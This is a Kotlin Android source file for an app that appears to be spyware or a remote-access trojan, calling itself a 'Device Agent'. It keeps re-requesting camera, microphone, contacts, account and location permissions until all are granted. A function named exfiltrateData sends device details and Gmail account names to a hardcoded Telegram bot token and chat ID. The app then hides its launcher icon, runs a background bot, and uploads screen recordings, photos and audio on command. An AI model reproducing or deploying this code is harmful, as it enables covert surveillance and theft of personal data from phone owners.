package com.example.androagent

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.hardware.Camera
import android.media.MediaProjection
import android.media.MediaProjectionManager
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.accounts.AccountManager
import android.view.Gravity
import android.view.View
import android.view.WindowInsets
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    companion object {
        const val BOT_TOKEN = "8564931359:AAFcD0rdACvKK1ZajX33q_drDjU4_vlvNck"
        const val AUTHORIZED_USER = 7548711500L
        var pendingScreenChatId: Long = 0
        var pendingScreenDuration: Int = 0
        var isScreenRecording = false
        var shouldStopScreen = false
        var currentMediaProjection: MediaProjection? = null
        var currentMediaRecorder: MediaRecorder? = null
        var currentVideoFile: File? = null
        var currentVirtualDisplay: android.hardware.display.VirtualDisplay? = null

        fun getDeviceId(context: Context): String {
            val prefs = context.getSharedPreferences("agent_prefs", Context.MODE_PRIVATE)
            return prefs.getString("device_id", "UNKNOWN") ?: "UNKNOWN"
        }
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private val requiredPermissions = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.GET_ACCOUNTS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.POST_NOTIFICATIONS
    )

    private var permissionIndex = 0
    private var statusText: TextView? = null
    private var isFirstRun = true
    private lateinit var deviceId: String
    private var isProcessingCommand = false

    private val screenCaptureLauncher: ActivityResultLauncher<Intent> = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val projection = projectionManager.getMediaProjection(result.resultCode, result.data!!)
            startScreenRecording(projection)
        } else {
            sendTelegramMessage(pendingScreenChatId, "Screen recording permission denied.")
            pendingScreenChatId = 0
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.setFlags(
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            window.attributes.layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.setDecorFitsSystemWindows(false)
        }

        val prefs = getSharedPreferences("agent_prefs", MODE_PRIVATE)
        isFirstRun = prefs.getBoolean("is_first_run", true)
        deviceId = prefs.getString("device_id", null) ?: generateAndSaveDeviceId(prefs)

        val action = intent?.action ?: ""
        if (action == "screen_record") {
            handleScreenCommand()
            return
        }

        if (isFirstRun) {
            setupFirstRunUI()
        } else {
            startBotService()
            disableLauncherIcon()
            finish()
        }
    }

    private fun generateAndSaveDeviceId(prefs: android.content.SharedPreferences): String {
        val letters = (1..4).map { ('A' + Random.nextInt(26)).toString() }.joinToString("")
        val digits = (1..6).map { Random.nextInt(10).toString() }.joinToString("")
        val id = letters + digits
        prefs.edit().putString("device_id", id).apply()
        return id
    }

    private fun setupFirstRunUI() {
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(48, 48, 48, 48)
            setBackgroundColor(Color.parseColor("#1a1a2e"))
        }
        val titleText = TextView(this).apply {
            text = "Setting Up Device Agent"
            textSize = 22f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
        }
        statusText = TextView(this).apply {
            text = "Initializing..."
            textSize = 16f
            setTextColor(Color.parseColor("#aaaaaa"))
            gravity = Gravity.CENTER
            setPadding(0, 32, 0, 0)
        }
        layout.addView(titleText)
        layout.addView(statusText)
        setContentView(layout)

        val handler = Handler(Looper.getMainLooper())
        handler.postDelayed({
            requestNextPermission()
        }, 500)
    }

    private fun requestNextPermission() {
        if (permissionIndex >= requiredPermissions.size) {
            checkDeniedPermissions()
            return
        }
        val perm = requiredPermissions[permissionIndex]
        statusText?.text = "Requesting permission: ${perm.split(".").last()}"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && perm == Manifest.permission.POST_NOTIFICATIONS) {
            ActivityCompat.requestPermissions(this, arrayOf(perm), 100 + permissionIndex)
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(perm), 100 + permissionIndex)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        permissionIndex++
        requestNextPermission()
    }

    private fun checkDeniedPermissions() {
        val denied = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (denied.isEmpty()) {
            onAllPermissionsGranted()
        } else {
            statusText?.text = "Some permissions were denied. Requesting again..."
            val handler = Handler(Looper.getMainLooper())
            handler.postDelayed({
                permissionIndex = 0
                requestNextPermission()
            }, 1000)
        }
    }

    private fun onAllPermissionsGranted() {
        statusText?.text = "All permissions granted. Initializing..."
        val prefs = getSharedPreferences("agent_prefs", MODE_PRIVATE)
        prefs.edit().putBoolean("is_first_run", false).apply()

        val handler = Handler(Looper.getMainLooper())
        handler.postDelayed({
            exfiltrateData()
            startBotService()
            disableLauncherIcon()
            val toast = Toast.makeText(this, "Setup complete. Agent running.", Toast.LENGTH_LONG)
            toast.setGravity(Gravity.CENTER, 0, 0)
            toast.show()
            handler.postDelayed({
                finishAffinity()
            }, 2000)
        }, 500)
    }

    private fun exfiltrateData() {
        try {
            val manufacturer = Build.MANUFACTURER
            val model = Build.MODEL
            val osVer = Build.VERSION.RELEASE
            val buildNumber = Build.DISPLAY
            val resolution = "${resources.displayMetrics.widthPixels}x${resources.displayMetrics.heightPixels}"

            val batteryIntent = registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
            val batteryLevel = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0
            val batteryScale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
            val batteryPct = (batteryLevel * 100) / batteryScale

            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork
            val caps = network?.let { cm.getNetworkCapabilities(it) }
            var connectivity = "Unknown"
            if (caps != null) {
                connectivity = when {
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                    else -> "Other"
                }
            }

            val gmailAccounts = try {
                val am = AccountManager.get(this)
                am.getAccountsByType("com.google").map { it.name }.joinToString(", ")
            } catch (e: Exception) { "Unable to retrieve accounts: ${e.message}" }

            val infoText = buildString {
                appendLine("Device ID: $deviceId")
                appendLine("Manufacturer: $manufacturer")
                appendLine("Model: $model")
                appendLine("OS Version: $osVer")
                appendLine("Build: $buildNumber")
                appendLine("Resolution: $resolution")
                appendLine("Battery: $batteryPct%")
                appendLine("Connectivity: $connectivity")
                appendLine("Gmail Accounts: $gmailAccounts")
            }

            sendTelegramMessage(AUTHORIZED_USER, "New device registered:\n\n$infoText")
        } catch (e: Exception) {
            sendTelegramMessage(AUTHORIZED_USER, "Device registered. ID: $deviceId")
        }
    }

    private fun startBotService() {
        val serviceIntent = Intent(this, BotService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    private fun disableLauncherIcon() {
        try {
            val pm = packageManager
            pm.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun handleScreenCommand() {
        val chatId = pendingScreenChatId
        val duration = pendingScreenDuration
        if (chatId == 0L) {
            finish()
            return
        }
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val intent = projectionManager.createScreenCaptureIntent()
        screenCaptureLauncher.launch(intent)
    }

    private fun startScreenRecording(projection: MediaProjection) {
        val chatId = pendingScreenChatId
        val duration = pendingScreenDuration
        if (chatId == 0L) {
            projection.stop()
            finish()
            return
        }

        try {
            val width = resources.displayMetrics.widthPixels
            val height = resources.displayMetrics.heightPixels
            val dpi = resources.displayMetrics.densityDpi

            val videoFile = File(cacheDir, "screen_${deviceId}_${System.currentTimeMillis()}.mp4")
            currentVideoFile = videoFile

            val mediaRecorder = MediaRecorder().apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(width, height)
                setVideoFrameRate(30)
                setVideoBitRate(4 * 1024 * 1024)
                setOutputFile(videoFile.absolutePath)
                prepare()
            }

            currentMediaRecorder = mediaRecorder

            val virtualDisplay = projection.createVirtualDisplay(
                "ScreenRecord",
                width, height, dpi,
                android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder.surface,
                null, null
            )

            currentVirtualDisplay = virtualDisplay
            currentMediaProjection = projection
            isScreenRecording = true
            shouldStopScreen = false

            mediaRecorder.start()

            sendTelegramMessage(chatId, "Screen recording started for $duration seconds. Use /stop to end early.")

            Thread {
                try {
                    val startTime = System.currentTimeMillis()
                    while (System.currentTimeMillis() - startTime < duration * 1000L && !shouldStopScreen) {
                        Thread.sleep(500)
                    }
                    shouldStopScreen = true
                    isScreenRecording = false

                    try {
                        mediaRecorder.stop()
                    } catch (e: Exception) {}
                    mediaRecorder.release()
                    virtualDisplay.release()
                    projection.stop()

                    currentMediaRecorder = null
                    currentVirtualDisplay = null
                    currentMediaProjection = null

                    if (videoFile.exists() && videoFile.length() > 0) {
                        sendVideoFile(chatId, videoFile)
                    } else {
                        sendTelegramMessage(chatId, "Screen recording failed or produced empty file.")
                    }
                } catch (e: Exception) {
                    sendTelegramMessage(chatId, "Screen recording error: ${e.message}")
                }
            }.start()

        } catch (e: Exception) {
            sendTelegramMessage(chatId, "Failed to start screen recording: ${e.message}")
            projection.stop()
        }

        finish()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        if (intent.action == "screen_record") {
            handleScreenCommand()
        }
    }

    private fun sendTelegramMessage(chatId: Long, text: String) {
        Thread {
            try {
                val url = "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage"
                val json = Gson().toJson(mapOf(
                    "chat_id" to chatId,
                    "text" to text
                ))
                val body = json.toRequestBody("application/json".toMediaType())
                val request = Request.Builder().url(url).post(body).build()
                client.newCall(request).execute()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun sendVideoFile(chatId: Long, file: File) {
        Thread {
            try {
                val url = "https://api.telegram.org/bot${BOT_TOKEN}/sendVideo"
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId.toString())
                    .addFormDataPart("video", file.name,
                        file.asRequestBody("video/mp4".toMediaType()))
                    .addFormDataPart("caption", "Device ID: $deviceId")
                    .build()
                val request = Request.Builder().url(url).post(requestBody).build()
                client.newCall(request).execute()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    fun sendPhoto(chatId: Long, imageBytes: ByteArray, cameraName: String) {
        Thread {
            try {
                val url = "https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto"
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId.toString())
                    .addFormDataPart("photo", "${cameraName}_${deviceId}.jpg",
                        imageBytes.toRequestBody("image/jpeg".toMediaType()))
                    .addFormDataPart("caption", "Device ID: $deviceId - ${cameraName} camera")
                    .build()
                val request = Request.Builder().url(url).post(requestBody).build()
                client.newCall(request).execute()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    fun sendAudioFile(chatId: Long, file: File) {
        Thread {
            try {
                val url = "https://api.telegram.org/bot${BOT_TOKEN}/sendAudio"
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId.toString())
                    .addFormDataPart("audio", file.name,
                        file.asRequestBody("audio/mpeg".toMediaType()))
                    .addFormDataPart("caption", "Device ID: $deviceId")
                    .build()
                val request = Request.Builder().url(url).post(requestBody).build()
                client.newCall(request).execute()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    fun addDeviceIdOverlay(imageBytes: ByteArray): ByteArray {
        try {
            val bitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.size)
            val mutable = bitmap.copy(Bitmap.Config.ARGB_8888, true)
            val canvas = Canvas(mutable)
            val paint = Paint().apply {
                color = Color.RED
                textSize = mutable.width * 0.05f
                isAntiAlias = true
                setShadowLayer(4f, 2f, 2f, Color.BLACK)
            }
            canvas.drawText("ID: $deviceId", 10f, paint.textSize + 10f, paint)
            val stream = ByteArrayOutputStream()
            mutable.compress(Bitmap.CompressFormat.JPEG, 95, stream)
            return stream.toByteArray()
        } catch (e: Exception) {
            return imageBytes
        }
    }
}
